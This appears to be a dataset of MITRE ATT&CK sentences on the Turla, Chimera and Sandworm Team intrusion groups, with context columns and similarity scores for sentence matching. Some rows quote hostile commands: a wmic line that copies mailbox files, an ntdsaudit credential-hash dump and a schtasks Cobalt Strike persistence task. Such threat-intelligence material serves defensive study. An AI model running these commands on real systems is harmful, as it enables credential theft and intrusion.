turla rpc backdoors have also enumerated processes associated with specific open ports or named pipes.,[14]enterpriset1566.002phishing:spearphishing linkturlaattempted to trick targets into clicking on a link featuring a seemingly legitimate domain from adobe.com to download their malware and gain initial access. [4]enterpriset1057process discoveryturlasurveys a system upon check-in to discover running processes using thetasklist /vcommand.,[1]turlarpc backdoors have also enumerated processes associated with specific open ports or named pipes.,[11]enterpriset1055process injectionturlahas also usedpowersploit'sinvoke-reflectivepeinjection.ps1to reflectively load a powershell payload into a random process on the victim system. [11].001dynamic-link library injectionturlahas used metasploit to perform reflective dll injection in order to escalate privileges.,66f56d333063d294857003b2,2944,0.8118450916637292
turla rpc backdoors have included local upnp rpc proxies.,[11]enterpriset1055process injectionturlahas also usedpowersploit'sinvoke-reflectivepeinjection.ps1to reflectively load a powershell payload into a random process on the victim system. [11].001dynamic-link library injectionturlahas used metasploit to perform reflective dll injection in order to escalate privileges.,[16][23]enterpriset1090proxyturlarpc backdoors have included local upnp rpc proxies.,[11].001internal proxyturlahas compromised internal network systems to act as a proxy to forward traffic to c2. [10]enterpriset1012query registryturlasurveys a system upon check-in to discover information in the windows registry with thereg querycommand.,66f56d333063d294857003b2,2947,0.7084742135316371
turla has also retrieved powershell payloads hidden in registry keys as well as checking keys associated with null session named pipes .,[11].001internal proxyturlahas compromised internal network systems to act as a proxy to forward traffic to c2. [10]enterpriset1012query registryturlasurveys a system upon check-in to discover information in the windows registry with thereg querycommand.,[1]turlahas also retrieved powershell payloads hidden in registry keys as well as checking keys associated with null session named pipes .,"[11]enterpriset1021.002remote services:smb/windows admin sharesturlausednet usecommands to connect to lateral systems within a network. [1]enterpriset1018remote system discoveryturlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /domaincommands.turlahas also usednet group ""domain computers"" /domain,net group ""domain controllers"" /domain, andnet group ""exchange servers"" /domainto enumerate domain computers, including the organization's dc and exchange server.",66f56d333063d294857003b2,2950,0.908357929000547
"additionally, a turla custom executable containing metasploit shellcode is saved to the startup folder to gain persistence.",[17]enterpriset1560.001archive collected data:archive via utilityturlahas encrypted files stolen from connected usb drives into a rar file before exfiltration. [18]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderaturlajavascript backdoor added a local_update_check value under the registry keyhklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runto establish persistence.,"additionally, aturlacustom executable containing metasploit shellcode is saved to the startup folder to gain persistence.",[4][16].004boot or logon autostart execution:winlogon helper dllturlaestablished persistence by adding a shell value under the registry keyhkcu\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon. [4]enterpriset1110brute forceturlamay attempt to connect to systems within a victim's network usingnet usecommands and a predefined list or collection of passwords.,66f56d333063d294857003b2,2902,0.8194695180788214
"turla has also used net group ""domain computers"" /domain, net group ""domain controllers"" /domain, and net group ""exchange servers"" /domain to enumerate domain computers, including the organization's dc and exchange server.",[1]turlahas also retrieved powershell payloads hidden in registry keys as well as checking keys associated with null session named pipes . [11]enterpriset1021.002remote services:smb/windows admin sharesturlausednet usecommands to connect to lateral systems within a network.,"[1]enterpriset1018remote system discoveryturlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /domaincommands.turlahas also usednet group ""domain computers"" /domain,net group ""domain controllers"" /domain, andnet group ""exchange servers"" /domainto enumerate domain computers, including the organization's dc and exchange server.","[1][14]enterpriset1518.001software discovery:security software discoveryturlahas obtained information on security software, including security logging information that may indicate whether their malware has been detected. [14]enterpriset1553.006subvert trust controls:code signing policy modificationturlahas modified variables in kernel memory to turn off driver signature enforcement after exploiting vulnerabilities that obtained kernel mode privileges.",66f56d333063d294857003b2,2952,0.7081189699125295
chimera has used custom dlls for continuous retrieval of data from memory.,[2].004application layer protocol:dnschimerahas usedcobalt striketo encapsulate c2 in dns traffic. [2]enterpriset1560.001archive collected data:archive via utilitychimerahas used gzip for linux os and a modified rar software to archive data on windows hosts.,[1][2]enterpriset1119automated collectionchimerahas used custom dlls for continuous retrieval of data from memory.,[2]enterpriset1217browser information discoverychimerahas usedtype \\\\\\\\c$\\\\users\\\\\\\\favorites\\\\links\\\\bookmarks bar\\\\imported from ie*citrix*for bookmark discovery. [2]enterpriset1110.003brute force:password sprayingchimerahas used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.,66f56e113063d29485700430,2364,0.7152789857972932
chimera has used type \\\\<hostname>\\c$\\users\\<username>\\favorites\\links\\bookmarks bar\\imported from ie\\*citrix* for bookmark discovery.,[2]enterpriset1560.001archive collected data:archive via utilitychimerahas used gzip for linux os and a modified rar software to archive data on windows hosts. [1][2]enterpriset1119automated collectionchimerahas used custom dlls for continuous retrieval of data from memory.,[2]enterpriset1217browser information discoverychimerahas usedtype \\\\\\\\c$\\\\users\\\\\\\\favorites\\\\links\\\\bookmarks bar\\\\imported from ie*citrix*for bookmark discovery.,[2]enterpriset1110.003brute force:password sprayingchimerahas used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts. [2].004brute force:credential stuffingchimerahas used credential stuffing against victim's remote services to obtain valid accounts.,66f56e113063d29485700430,2365,0.745906973151896
"in preparation for its attack against the 2018 winter olympics, sandworm team conducted online research of partner organizations listed on an official pyeongchang olympics partnership site.",[1].003gather victim identity information:employee namessandworm team's research of potential victim organizations included the identification and collection of employee information. [1]enterpriset1590.001gather victim network information:domain propertiessandworm teamconducted technical reconnaissance of the parliament of georgia's official internet domain prior to its 2019 attack.,"[1]enterpriset1591.002gather victim org information:business relationshipsin preparation for its attack against the 2018 winter olympics,sandworm teamconducted online research of partner organizations listed on an official pyeongchang olympics partnership site.","[1]enterpriset1562.001impair defenses:disable or modify toolsduring the2015 ukraine electric power attack,sandworm teammodified in-registry internet settings to lower internet security. [14].002impair defenses:disable windows event loggingduring the2016 ukraine electric power attack,sandworm teamdisabled event logging on compromised systems.",66f56dc63063d2948570040d,1314,0.7952414954451202
sandworm team's vbs backdoor can decode base64-encoded data and save it to the %temp% folder.,"[13]enterpriset1005data from local systemsandworm teamhas exfiltrated internal documents, files, and other data from compromised hosts. [1]enterpriset1491.002defacement:external defacementsandworm teamdefaced approximately 15,000 websites belonging to georgian government, non-government, and private sector organizations in 2019.",[1][2]enterpriset1140deobfuscate/decode files or informationsandworm team's vbs backdoor can decode base64-encoded data and save it to the %temp% folder.,"the group also decrypted received information using the triple des algorithm and decompresses it using gzip. [21][22]enterpriset1587.001develop capabilities:malwaresandworm teamhas developed malware for its operations, including malicious mobile applications and destructive malware such asnotpetyaandolympic destroyer.",66f56dc63063d2948570040d,1296,0.7689078786512707
the group also decrypted received information using the triple des algorithm and decompresses it using gzip.,"[1]enterpriset1491.002defacement:external defacementsandworm teamdefaced approximately 15,000 websites belonging to georgian government, non-government, and private sector organizations in 2019. [1][2]enterpriset1140deobfuscate/decode files or informationsandworm team's vbs backdoor can decode base64-encoded data and save it to the %temp% folder.",the group also decrypted received information using the triple des algorithm and decompresses it using gzip.,"[21][22]enterpriset1587.001develop capabilities:malwaresandworm teamhas developed malware for its operations, including malicious mobile applications and destructive malware such asnotpetyaandolympic destroyer. [1]enterpriset1561.002disk wipe:disk structure wipesandworm teamhas used theblackenergykilldisk component to corrupt the infected system's master boot record.",66f56dc63063d2948570040d,1297,1.0000000000000002
"sandworm team has registered domain names and created urls that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages.","[22]enterpriset1098account manipulationduring the2016 ukraine electric power attack,sandworm teamused thesp_addlinkedsrvlogincommand in ms-sql to create a link between a created account and other servers in the network. [17]enterpriset1583acquire infrastructuresandworm teamused various third-party email campaign management services to deliver phishing emails.","[13].001domainssandworm teamhas registered domain names and created urls that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure.",[1][23].004serversandworm teamhas leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations. [1]enterpriset1595.002active scanning:vulnerability scanningsandworm teamhas scanned network infrastructure for vulnerabilities as part of its operational planning.,66f56dc63063d2948570040d,1264,0.8194078380624601
sandworm team's research of potential victim organizations included the identification and collection of employee information.,"[1][17]enterpriset1592.002gather victim host information:softwaresandworm teamhas researched software code to enable supply-chain operations, most notably for the 2017notpetyaattack.sandworm teamalso collected a list of computers using specific software as part of its targeting efforts. [1]enterpriset1589.002gather victim identity information:email addressessandworm teamhas obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.",[1].003gather victim identity information:employee namessandworm team's research of potential victim organizations included the identification and collection of employee information.,"[1]enterpriset1590.001gather victim network information:domain propertiessandworm teamconducted technical reconnaissance of the parliament of georgia's official internet domain prior to its 2019 attack. [1]enterpriset1591.002gather victim org information:business relationshipsin preparation for its attack against the 2018 winter olympics,sandworm teamconducted online research of partner organizations listed on an official pyeongchang olympics partnership site.",66f56dc63063d2948570040d,1312,0.7727706795346916
"sandworm team temporarily disrupted service to georgian government, non-government, and private sector websites after compromising a georgian web hosting provider in 2019.","[1]enterpriset1561.002disk wipe:disk structure wipesandworm teamhas used theblackenergykilldisk component to corrupt the infected system's master boot record. [29][25]enterpriset1484.001domain or tenant policy modification:group policy modificationduring the2022 ukraine electric power attack,sandworm teamleveraged group policy objects (gpos) to deploy and execute malware.","[19]enterpriset1499endpoint denial of servicesandworm teamtemporarily disrupted service to georgian government, non-government, and private sector websites after compromising a georgian web hosting provider in 2019.",[1]enterpriset1585.001establish accounts:social media accountssandworm teamhas established social media accounts to disseminate victim internal-only documents and other sensitive data. [1].002establish accounts:email accountssandworm teamhas created email accounts that mimic legitimate organizations for its spearphishing operations.,66f56dc63063d2948570040d,1301,0.7650159421971133
"chimera has used legitimate credentials to login to an external vpn, citrix, ssh, and other remote services.",[2]enterpriset1041exfiltration over c2 channelchimerahas usedcobalt strikec2 beacons for data exfiltration. [2]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagechimerahas exfiltrated stolen data to onedrive accounts.,"[2]enterpriset1133external remote serviceschimerahas used legitimate credentials to login to an external vpn, citrix, ssh, and other remote services.",[1][2]enterpriset1083file and directory discoverychimerahas utilized multiple commands to identify data of interest in file and directory listings. [2]enterpriset1589.001gather victim identity information:credentialschimerahas collected credentials for the target organization from previous breaches for use in brute force attacks.,66f56e113063d29485700430,2379,0.7551937233355588
chimera has utilized multiple commands to identify data of interest in file and directory listings.,"[2]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagechimerahas exfiltrated stolen data to onedrive accounts. [2]enterpriset1133external remote serviceschimerahas used legitimate credentials to login to an external vpn, citrix, ssh, and other remote services.",[1][2]enterpriset1083file and directory discoverychimerahas utilized multiple commands to identify data of interest in file and directory listings.,[2]enterpriset1589.001gather victim identity information:credentialschimerahas collected credentials for the target organization from previous breaches for use in brute force attacks. [2]enterpriset1574.002hijack execution flow:dll side-loadingchimerahas used side loading to place malicious dlls in memory.,66f56e113063d29485700430,2380,0.7496169516278267
"sandworm team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.","[17]enterpriset1070.004indicator removal:file deletionsandworm teamhas used backdoors that can delete files used in an attack from an infected system. [21][22]during the2015 ukraine electric power attack, vba_macro.exe deletes itself afterfontcache.dat,rundll32.exe, and the associated .lnk file is delivered.","[14]enterpriset1105ingress tool transfersandworm teamhas pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.","[21][1]during the2015 ukraine electric power attack,sandworm teampushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. [14]enterpriset1056.001input capture:keyloggingsandworm teamhas used a keylogger to capture keystrokes by using the setwindowshookex function.",66f56dc63063d2948570040d,1319,0.7214756349938287
"chimera has harvested data from victim's e-mail including through execution of wmic /node:<ip> process call create ""cmd /c copy c:\\users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst"" copy ""i:\\<path>\\<username>\\my documents\\<filename>.pst""
copy.",[2].002data staged:remote data stagingchimerahas staged stolen data on designated servers in the target environment. [2]enterpriset1482domain trust discoverychimerahasnltest /domain_truststo identify domain trust relationships.,"[2]enterpriset1114.001email collection:local email collectionchimerahas harvested data from victim's e-mail including through execution ofwmic /node:process call create ""cmd /c copy c:\\\\users\\\\\\\\\\\\backup.pst c:\\\\windows\\\\temp\\\\backup.pst"" copy ""i:\\\\\\\\\\\\my documents\\\\.pst""copy.",[2].002email collection:remote email collectionchimerahas harvested data from remote mailboxes including through execution of\\\\\\\\c$\\\\users\\\\\\\\appdata\\\\local\\\\microsoft\\\\outlook*.ost. [2]enterpriset1041exfiltration over c2 channelchimerahas usedcobalt strikec2 beacons for data exfiltration.,66f56e113063d29485700430,2375,0.7790070890729628
sandworm team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.,[1]enterpriset1199trusted relationshipsandworm teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization. [1]enterpriset1204.001user execution:malicious linksandworm teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,[1].002user execution:malicious filesandworm teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.,"[21][1]during the2015 ukraine electric power attack,sandworm teamleveraged microsoft office attachments which contained malicious macros that were automatically executed once the user permitted them. [34]enterpriset1078valid accountssandworm teamhave used previously acquired legitimate credentials prior to attacks.",66f56dc63063d2948570040d,1378,0.7605322292903927
sandworm team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,[1][17]enterpriset1033system owner/user discoverysandworm teamhas collected the username from a compromised host. [1]enterpriset1199trusted relationshipsandworm teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.,[1]enterpriset1204.001user execution:malicious linksandworm teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[1].002user execution:malicious filesandworm teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files. [21][1]during the2015 ukraine electric power attack,sandworm teamleveraged microsoft office attachments which contained malicious macros that were automatically executed once the user permitted them.",66f56dc63063d2948570040d,1377,0.7752535519501564
apt28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,[1][17]enterpriset1033system owner/user discoverysandworm teamhas collected the username from a compromised host. [1]enterpriset1199trusted relationshipsandworm teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.,[1]enterpriset1204.001user execution:malicious linksandworm teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[1].002user execution:malicious filesandworm teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files. [21][1]during the2015 ukraine electric power attack,sandworm teamleveraged microsoft office attachments which contained malicious macros that were automatically executed once the user permitted them.",66f56dc63063d2948570040d,1377,0.7896776166827633
"chimera has renamed malware to googleupdate.exe and winrar to jucheck.exe, recordedtv.ms, teredo.tmp, update.exe, and msadcs1.exe.",[2]enterpriset1105ingress tool transferchimerahas remotely copied tools and malware onto targeted systems. [1]enterpriset1570lateral tool transferchimerahas copied tools between compromised hosts using smb.,"[2]enterpriset1036.005masquerading:match legitimate name or locationchimerahas renamed malware to googleupdate.exe and winrar to jucheck.exe, recordedtv.ms, teredo.tmp, update.exe, and msadcs1.exe.",[1]enterpriset1556.001modify authentication process:domain controller authenticationchimera's malware has altered the ntlm authentication program on domain controllers to allowchimerato login without a valid credential. [1]enterpriset1111multi-factor authentication interceptionchimerahas registered alternate phone numbers for compromised users to intercept 2fa codes sent via sms.,66f56e113063d29485700430,2388,0.8268012581863323
"chimera specifically has used the ntdsaudit tool to dump the password hashes of domain users via cmsadcs.exe ""ntds.dit"" -s ""system"" -p recordedtv_pdmp.txt --users-csv recordedtv_users.csv and used ntdsutil to copy the active directory database.","[1]enterpriset1588.002obtain capabilities:toolchimerahas obtained and used tools such asbloodhound,cobalt strike,mimikatz, andpsexec. [1][2]enterpriset1003.003os credential dumping:ntdschimerahas gathered the system registry and ntds.dit files from target systems.","[1]chimeraspecifically has used the ntdsaudit tool to dump the password hashes of domain users viamsadcs.exe ""ntds.dit"" -s ""system"" -p recordedtv_pdmp.txt --users-csv recordedtv_users.csvand used ntdsutil to copy the active directory database.",[2]enterpriset1201password policy discoverychimerahas used the ntdsaudit utility to collect information related to accounts and passwords. [2]enterpriset1069.001permission groups discovery:local groupschimerahas usednet localgroup administratorsto identify  accounts with local administrative rights.,66f56e113063d29485700430,2397,0.7959600523322963
"sandworm team has also used rot13 encoding, aes encryption and compression with the zlib library for their python-based backdoor.","[30]during the2016 ukraine electric power attack,sandworm teamused heavily obfuscated code withindustroyerin its windows notepad backdoor. [16].002software packingduring the2016 ukraine electric power attack,sandworm teamused upx to pack a copy ofmimikatz.","[17].010command obfuscationsandworm teamhas used rot13 encoding, aes encryption and compression with the zlib library for their python-based backdoor.","[21]enterpriset1588.002obtain capabilities:toolsandworm teamhas acquired open-source tools for their operations, includinginvoke-psimage, which was used to establish an encrypted channel from a compromised host tosandworm team's c2 server in preparation for the 2018 winter olympics attack, as well asimpacketand remoteexec, which were used in their 2022prestigeoperations. [1][11].006obtain capabilities:vulnerabilitiesin 2017,sandworm teamconducted technical research related to vulnerabilities associated with websites used by the korean sport and olympic committee, a korean power company, and a korean airport.",66f56dc63063d2948570040d,1340,0.7265617154262827
chimera has used powershell scripts to execute malicious payloads and the dsinternals powershell module to make use of active directory features.,[2]enterpriset1110.003brute force:password sprayingchimerahas used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts. [2].004brute force:credential stuffingchimerahas used credential stuffing against victim's remote services to obtain valid accounts.,[2]enterpriset1059.001command and scripting interpreter:powershellchimerahas used powershell scripts to execute malicious payloads and the dsinternals powershell module to make use of active directory features.,[1][2].003command and scripting interpreter:windows command shellchimerahas used the windows command shell and batch scripts for execution on compromised hosts. [2]enterpriset1213.002data from information repositories:sharepointchimerahas collected documents from the victim's sharepoint.,66f56e113063d29485700430,2368,0.7055569882383241
"sandworm team's bcs-server tool can create an internal proxy server to redirect traffic from the adversary-controlled c2 to internal servers which may not be connected to the internet, but are interconnected locally.","[1]enterpriset1055process injectionduring the2015 ukraine electric power attack,sandworm teamloadedblackenergyinto svchost.exe, which then launched iexplore.exe for their c2. [14]enterpriset1572protocol tunnelingduring the2022 ukraine electric power attack,sandworm teamdeployed the gogetter tunneler software to establish a ""yamux"" tls-based c2 channel with an external server(s).","[19]enterpriset1090proxysandworm team's bcs-server tool can create an internal proxy server to redirect traffic from the adversary-controlled c2 to internal servers which may not be connected to the internet, but are interconnected locally.",[21]enterpriset1219remote access softwaresandworm teamhas used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers. [29][11]enterpriset1021.002remote services:smb/windows admin sharessandworm teamhas copied payloads to theadmin$share of remote systems and runnet useto connect to network shares.,66f56dc63063d2948570040d,1352,0.9165824085108772
sandworm team has used remote administration tools or remote industrial control system client software to maliciously release electricity breakers.,"[14]enterpriset1572protocol tunnelingduring the2022 ukraine electric power attack,sandworm teamdeployed the gogetter tunneler software to establish a ""yamux"" tls-based c2 channel with an external server(s). [19]enterpriset1090proxysandworm team's bcs-server tool can create an internal proxy server to redirect traffic from the adversary-controlled c2 to internal servers which may not be connected to the internet, but are interconnected locally.",[21]enterpriset1219remote access softwaresandworm teamhas used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.,"[29][11]enterpriset1021.002remote services:smb/windows admin sharessandworm teamhas copied payloads to theadmin$share of remote systems and runnet useto connect to network shares. [17][11]during the2016 ukraine electric power attack,sandworm teamutilizednet useto connect to network shares.",66f56dc63063d2948570040d,1353,0.7566773097152915
chimera has staged stolen data on designated servers in the target environment.,[2]enterpriset1039data from network shared drivechimerahas collected data of interest from network shares. [2]enterpriset1074.001data staged:local data stagingchimerahas staged stolen data locally on compromised hosts.,[2].002data staged:remote data stagingchimerahas staged stolen data on designated servers in the target environment.,"[2]enterpriset1482domain trust discoverychimerahasnltest /domain_truststo identify domain trust relationships. [2]enterpriset1114.001email collection:local email collectionchimerahas harvested data from victim's e-mail including through execution ofwmic /node:process call create ""cmd /c copy c:\\\\users\\\\\\\\\\\\backup.pst c:\\\\windows\\\\temp\\\\backup.pst"" copy ""i:\\\\\\\\\\\\my documents\\\\.pst""copy.",66f56e113063d29485700430,2373,0.713518700973578
chimera has harvested data from remote mailboxes including through execution of \\\\<hostname>\\c$\\users\\<username>\\appdata\\local\\microsoft\\outlook*.ost.,"[2]enterpriset1482domain trust discoverychimerahasnltest /domain_truststo identify domain trust relationships. [2]enterpriset1114.001email collection:local email collectionchimerahas harvested data from victim's e-mail including through execution ofwmic /node:process call create ""cmd /c copy c:\\\\users\\\\\\\\\\\\backup.pst c:\\\\windows\\\\temp\\\\backup.pst"" copy ""i:\\\\\\\\\\\\my documents\\\\.pst""copy.",[2].002email collection:remote email collectionchimerahas harvested data from remote mailboxes including through execution of\\\\\\\\c$\\\\users\\\\\\\\appdata\\\\local\\\\microsoft\\\\outlook*.ost.,[2]enterpriset1041exfiltration over c2 channelchimerahas usedcobalt strikec2 beacons for data exfiltration. [2]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagechimerahas exfiltrated stolen data to onedrive accounts.,66f56e113063d29485700430,2376,0.7087686829683649
"sandworm team has used a tool to query active directory using ldap, discovering information about computers listed in ad.","[29][11]enterpriset1021.002remote services:smb/windows admin sharessandworm teamhas copied payloads to theadmin$share of remote systems and runnet useto connect to network shares. [17][11]during the2016 ukraine electric power attack,sandworm teamutilizednet useto connect to network shares.","[17]enterpriset1018remote system discoverysandworm teamhas used a tool to query active directory using ldap, discovering information about computers listed in ad.","[21][17]during the2015 ukraine electric power attack,sandworm teamremotely discovered systems over lan connections. ot systems were visible from the it network   as well, giving adversaries the ability to discover operational assets.",66f56dc63063d2948570040d,1356,0.7355988868798502
chimera has utilized various scans and queries to find domain controllers and remote services in the target environment.,[1].002remote services:smb/windows admin shareschimerahas used windows admin shares to move laterally. [1][2].006remote services:windows remote managementchimerahas used winrm for lateral movement.,[2]enterpriset1018remote system discoverychimerahas utilized various scans and queries to find domain controllers and remote services in the target environment.,"[2]enterpriset1053.005scheduled task/job:scheduled taskchimerahas used scheduled tasks to invoke cobalt strike including through batch scriptschtasks /create /ru ""system"" /tn ""update"" /tr ""cmd /c c:\\\\windows\\\\temp\\\\update.bat"" /sc once /f /stand to maintain persistence. [1][2]enterpriset1082system information discoverychimerahas usedfsutil fsinfo drives,systeminfo, andvssadmin list shadowsfor system information including shadow volumes and drive information.",66f56e113063d29485700430,2406,0.7886695495666977
"chimera has used scheduled tasks to invoke cobalt strike including through batch script schtasks /create /ru ""system"" /tn ""update"" /tr ""cmd /c c:\\windows\\temp\\update.bat"" /sc once /f /st and to maintain persistence.",[1][2].006remote services:windows remote managementchimerahas used winrm for lateral movement. [2]enterpriset1018remote system discoverychimerahas utilized various scans and queries to find domain controllers and remote services in the target environment.,"[2]enterpriset1053.005scheduled task/job:scheduled taskchimerahas used scheduled tasks to invoke cobalt strike including through batch scriptschtasks /create /ru ""system"" /tn ""update"" /tr ""cmd /c c:\\\\windows\\\\temp\\\\update.bat"" /sc once /f /stand to maintain persistence.","[1][2]enterpriset1082system information discoverychimerahas usedfsutil fsinfo drives,systeminfo, andvssadmin list shadowsfor system information including shadow volumes and drive information. [2]enterpriset1016system network configuration discoverychimerahas usedipconfig,ping, andtracertto enumerate the ip address and network environment and settings of the local host.",66f56e113063d29485700430,2407,0.7198020320943377
sandworm team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.,"[17]enterpriset1583acquire infrastructuresandworm teamused various third-party email campaign management services to deliver phishing emails. [13].001domainssandworm teamhas registered domain names and created urls that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure.",[1][23].004serversandworm teamhas leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.,[1]enterpriset1595.002active scanning:vulnerability scanningsandworm teamhas scanned network infrastructure for vulnerabilities as part of its operational planning. [1]enterpriset1071.001application layer protocol:web protocolssandworm team's bcs-server tool connects to the designated c2 server via http.,66f56dc63063d2948570040d,1265,0.8190282465005772
sandworm team has established social media accounts to disseminate victim internal-only documents and other sensitive data.,"[29][25]enterpriset1484.001domain or tenant policy modification:group policy modificationduring the2022 ukraine electric power attack,sandworm teamleveraged group policy objects (gpos) to deploy and execute malware. [19]enterpriset1499endpoint denial of servicesandworm teamtemporarily disrupted service to georgian government, non-government, and private sector websites after compromising a georgian web hosting provider in 2019.",[1]enterpriset1585.001establish accounts:social media accountssandworm teamhas established social media accounts to disseminate victim internal-only documents and other sensitive data.,[1].002establish accounts:email accountssandworm teamhas created email accounts that mimic legitimate organizations for its spearphishing operations. [1]enterpriset1041exfiltration over c2 channelsandworm teamhas sent system information to its c2 server using http.,66f56dc63063d2948570040d,1302,0.7159871355070396
sandworm team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.,"[30][29][21][1]during the2015 ukraine electric power attack,sandworm teamobtained their initial foothold into many it systems using microsoft office attachments delivered through phishing emails. [34].002phishing:spearphishing linksandworm teamhas crafted phishing emails containing malicious hyperlinks.",[1]enterpriset1598.003phishing for information:spearphishing linksandworm teamhas crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.,"[1]enterpriset1055process injectionduring the2015 ukraine electric power attack,sandworm teamloadedblackenergyinto svchost.exe, which then launched iexplore.exe for their c2. [14]enterpriset1572protocol tunnelingduring the2022 ukraine electric power attack,sandworm teamdeployed the gogetter tunneler software to establish a ""yamux"" tls-based c2 channel with an external server(s).",66f56dc63063d2948570040d,1349,0.7407322784341307
sandworm team's bcs-server tool uses base64 encoding and html tags for the communication traffic between the c2 server.,"[21]enterpriset1485data destructionsandworm teamhas used theblackenergykilldisk component to overwrite files on windows-based human-machine interfaces. [29][25]during the2022 ukraine electric power attack,sandworm teamdeployedcaddywiperon the victim’s it environment systems to wipe files related to the ot capabilities, along with mapped drives, and physical drive partitions.",[19]enterpriset1132.001data encoding:standard encodingsandworm team's bcs-server tool uses base64 encoding and html tags for the communication traffic between the c2 server.,[21]enterpriset1486data encrypted for impactsandworm teamhas usedprestigeransomware to encrypt data at targeted organizations in transportation and related logistics industries in ukraine and poland. [11]enterpriset1213data from information repositoriessandworm teamexfiltrates data of interest from enterprise databases using adminer.,66f56dc63063d2948570040d,1291,0.7512321913886466
it has also accessed network diagram files useful for understanding how a host's network was configured.,"[14]enterpriset1082system information discoverysandworm teamused a backdoor to enumerate information about the infected system's operating system. [22][1]enterpriset1049system network connections discoverysandworm teamhad gathered user, ip address, and server data related to rdp sessions on a compromised host.",it has also accessed network diagram files useful for understanding how a host's network was configured.,[1][17]enterpriset1033system owner/user discoverysandworm teamhas collected the username from a compromised host. [1]enterpriset1199trusted relationshipsandworm teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.,66f56dc63063d2948570040d,1374,1.0
sandworm team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.,it has also accessed network diagram files useful for understanding how a host's network was configured. [1][17]enterpriset1033system owner/user discoverysandworm teamhas collected the username from a compromised host.,[1]enterpriset1199trusted relationshipsandworm teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.,[1]enterpriset1204.001user execution:malicious linksandworm teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders. [1].002user execution:malicious filesandworm teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.,66f56dc63063d2948570040d,1376,0.751657999473306
chimera has registered alternate phone numbers for compromised users to intercept 2fa codes sent via sms.,"[2]enterpriset1036.005masquerading:match legitimate name or locationchimerahas renamed malware to googleupdate.exe and winrar to jucheck.exe, recordedtv.ms, teredo.tmp, update.exe, and msadcs1.exe. [1]enterpriset1556.001modify authentication process:domain controller authenticationchimera's malware has altered the ntlm authentication program on domain controllers to allowchimerato login without a valid credential.",[1]enterpriset1111multi-factor authentication interceptionchimerahas registered alternate phone numbers for compromised users to intercept 2fa codes sent via sms.,[2]enterpriset1106native apichimerahas used direct windows system calls by leveraging dumpert. [1]enterpriset1046network service discoverychimerahas used theget -b-e-pcommand for network scanning as well as a custom python tool  packed into a windows executable named get.exe to scan ip ranges for http.,66f56e113063d29485700430,2390,0.7792222183428942
"in 2017, sandworm team conducted technical research related to vulnerabilities associated with websites used by the korean sport and olympic committee, a korean power company, and a korean airport.","[17].010command obfuscationsandworm teamhas used rot13 encoding, aes encryption and compression with the zlib library for their python-based backdoor. [21]enterpriset1588.002obtain capabilities:toolsandworm teamhas acquired open-source tools for their operations, includinginvoke-psimage, which was used to establish an encrypted channel from a compromised host tosandworm team's c2 server in preparation for the 2018 winter olympics attack, as well asimpacketand remoteexec, which were used in their 2022prestigeoperations.","[1][11].006obtain capabilities:vulnerabilitiesin 2017,sandworm teamconducted technical research related to vulnerabilities associated with websites used by the korean sport and olympic committee, a korean power company, and a korean airport.","[1]enterpriset1003.001os credential dumping:lsass memorysandworm teamhas used its plainpwd tool, a modified version ofmimikatz, and comsvcs.dll to dump windows credentials from system memory. [21][25][11]during the2016 ukraine electric power attack,sandworm teamusedmimikatzto capture and use legitimate credentials.",66f56dc63063d2948570040d,1342,0.8407148723593506
